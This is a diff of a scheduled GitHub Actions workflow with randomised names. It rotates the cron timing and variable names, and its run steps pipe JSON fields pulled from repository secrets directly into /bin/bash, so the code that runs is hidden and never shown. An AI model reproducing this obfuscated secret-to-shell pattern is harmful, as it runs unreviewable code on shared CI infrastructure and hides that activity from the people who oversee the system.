@@ -3,7 +3,7 @@ name: qiehuanqhx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 4/6 * * *'
+    - cron: '29 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,15 +12,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: qiehuanqhx
         env:
-          tsr5: ${{ secrets.tsr5 }}
+          r60: ${{ secrets.r60 }}
         run: |
-          echo $tsr5 | jq -r .pwndy21 | /bin/bash
-          echo $patp6606 | jq -r .s35 | /bin/bash
-          echo $vi80 | jq -r .bn3327 | /bin/bash
-          echo $xnyn84137 | jq -r .n7 | /bin/bash
-          echo $sievl6650 | jq -r .sol3758 | /bin/bash
-          echo $kuqo38 | jq -r .umjd4128 | /bin/bash
-          echo $fcsn05913 | jq -r .w44 | /bin/bash
-          echo $p890 | jq -r .ne3946 | /bin/bash
-          echo $folik42 | jq -r .n6514 | /bin/bash
+          echo $r60 | jq -r .xge19892 | /bin/bash
+          echo $gfsuj846 | jq -r .no349 | /bin/bash
+          echo $fsb82 | jq -r .mwwpl357 | /bin/bash
+          echo $dmb1072 | jq -r .oa2 | /bin/bash
+          echo $fctl4 | jq -r .aohis9 | /bin/bash
+          echo $wkz5752 | jq -r .fbwle417 | /bin/bash
+          echo $u3 | jq -r .xmy61 | /bin/bash
+          echo $iwv53 | jq -r .d8 | /bin/bash
+          echo $kqjg1214 | jq -r .sutka92438 | /bin/bash
+          echo $wffd61148 | jq -r .uukwy6 | /bin/bash
+          echo $oje9 | jq -r .qj947 | /bin/bash
+          echo $vrs24 | jq -r .bc26278 | /bin/bash
+          echo $dx2 | jq -r .joy0042 | /bin/bash
 
